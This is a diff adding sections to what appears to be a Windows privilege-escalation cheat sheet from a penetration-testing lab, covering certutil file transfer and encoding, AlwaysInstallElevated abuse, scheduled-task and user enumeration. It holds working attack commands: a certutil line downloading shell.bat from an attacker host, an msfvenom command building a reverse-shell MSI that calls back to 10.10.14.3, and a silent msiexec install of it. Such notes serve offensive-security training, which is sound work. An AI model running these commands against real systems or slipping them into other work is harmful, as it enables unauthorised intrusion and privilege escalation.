@@ -324,3 +324,59 @@ $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Un
 $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
 $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
 ```
+
+## Certutil
+
+### File Transfers
+
+```cmd
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+
+### Encode and Decode Files
+
+```cmd
+certutil -encode file1 encodedfile
+```
+
+```cmd
+certutil -decode encodedfile file2
+```
+
+## Always Install Elevated
+
+```cmd
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+```
+
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+```
+
+```cmd
+msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+
+## Windows Scheduled Tasks
+
+```cmd
+schtasks /query /fo LIST /v
+```
+
+```powershell
+Get-ScheduledTask | select TaskName,State
+```
+
+## User/Computer Description Fields
+
+```powershell
+Get-LocalUser
+```
+
+```powershell
+Get-WmiObject -Class Win32_OperatingSystem | select Description
+```
